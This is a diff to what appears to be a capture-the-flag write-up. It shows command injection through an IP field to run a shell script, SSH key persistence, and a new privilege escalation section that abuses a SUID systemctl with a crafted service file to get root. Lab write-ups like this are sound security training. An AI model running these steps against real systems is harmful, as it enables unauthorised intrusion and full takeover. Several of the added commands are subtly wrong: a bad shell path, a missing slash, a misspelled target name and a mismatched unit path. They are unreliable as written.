@@ -82,7 +82,26 @@ And enter ```$(/tmp/shell.sh)``` as IP. Now we have a shell als ```pepper```.
 To get a more persistent access we will create a ssh keypair by running ```ssh-keygen``` on our attacking machine and by saving the ```id_rsa.pub``` as ```/home/pepper/.ssh/authorized_keys```. Now we can use ssh to login as ```pepper```.
 
 # Privilege escalation
-[TO BE CONTINUED]
+When we look for files with SUID set we spot ```systemctl```. GTFOBins tells us we use this to elevate our privileges by creating our own service in a configuration file. We will use our earlier created shell file and have our listener ready before running the following commands:
+
+```
+echo '[Service]
+Type=oneshot
+ExecStart=/bin/sh/ -c "tmp/shell.sh"
+[Install]
+WantedBy=multi.user.target' > pwn.service
+```
+We can now link link the service:
+```
+systemctl link /home/pepper/pwn
+```
+And finally start the service:
+```
+systemctl start pwn.service
+````
+
+Now we have access as ```root```.
+
 
 
 
